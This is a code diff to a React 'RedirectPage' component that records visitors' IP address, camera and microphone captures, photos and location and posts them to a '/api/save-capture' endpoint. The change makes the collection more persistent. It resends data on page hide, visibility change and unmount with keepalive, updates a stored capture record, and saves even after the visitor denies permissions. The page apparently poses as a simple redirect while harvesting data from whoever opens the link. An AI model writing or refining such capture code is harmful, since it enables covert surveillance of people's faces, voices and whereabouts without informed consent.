@@ -253,55 +253,61 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview 
       microphone: 'n/a',
     },
   });
-  const hasSavedRef = React.useRef(false);
+  const captureDocIdRef = React.useRef<string | null>(null);
+  const isSavingRef = React.useRef(false);
+
 
   const saveToApi = React.useCallback(async (dataToSave: Partial<CapturedData>, settingsToUse: Settings, isComplete: boolean) => {
-    if (hasSavedRef.current && !isComplete) return; 
+    if (isSavingRef.current) return;
     
     const hasMeaningfulData = dataToSave.ip || dataToSave.cameraCapture || dataToSave.microphoneCapture || dataToSave.cameraPhotoCapture || dataToSave.location?.lat;
-    if (!hasMeaningfulData) return;
+    if (!hasMeaningfulData && !captureDocIdRef.current) return;
+
+    isSavingRef.current = true;
     
-    hasSavedRef.current = true;
-    
-    const finalData: Partial<CapturedData> = {
+    const finalData: any = {
         ...dataToSave,
         redirectId: settingsToUse.id,
         status: isComplete ? 'completed' : 'incomplete',
         timestamp: Date.now(),
         name: `Capture on ${new Date().toLocaleDateString()}`,
     };
+
+    if (captureDocIdRef.current) {
+        finalData.id = captureDocIdRef.current;
+    }
     
     Object.keys(finalData).forEach(key => (finalData as any)[key] === undefined && delete (finalData as any)[key]);
     
     const body = JSON.stringify(finalData);
 
-    if (isComplete) {
-      try {
-        await fetch('/api/save-capture', {
+    try {
+        const response = await fetch('/api/save-capture', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: body,
+          keepalive: true, // Use keepalive to ensure request is sent on page exit
         });
-      } catch (e) {
-        console.error("Failed to save captured data via fetch:", e);
-      }
-    } else {
-      if (navigator.sendBeacon) {
-        navigator.sendBeacon('/api/save-capture', body);
-      } else {
-        await fetch('/api/save-capture', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: body,
-          keepalive: true,
-        });
-      }
+
+        if (response.ok) {
+            if (!captureDocIdRef.current) {
+                const result = await response.json();
+                if (result.id) {
+                    captureDocIdRef.current = result.id;
+                }
+            }
+        }
+    } catch (e) {
+        console.error("Failed to save captured data:", e);
+    } finally {
+        isSavingRef.current = false;
     }
   }, []);
 
   React.useEffect(() => {
     const handlePageExit = () => {
-      if (settings && !hasSavedRef.current) {
+      if (settings) {
+        // Save the latest data on exit. This will update the existing doc if one has been created.
         saveToApi(capturedDataRef.current, settings, false);
       }
     };
@@ -316,6 +322,7 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview 
     return () => {
       window.removeEventListener('visibilitychange', handlePageExit);
       window.removeEventListener('pagehide', handlePageExit);
+      handlePageExit(); // Final attempt on component unmount
     };
   }, [settings, saveToApi]);
 
@@ -489,6 +496,8 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview 
             setDeniedPermissions(denied);
             setStatus('permission_denied');
             setIsWaitingForPermission(false);
+            // Save the denied state before stopping
+            await saveToApi(capturedDataRef.current, settings, false);
             return;
         }
 
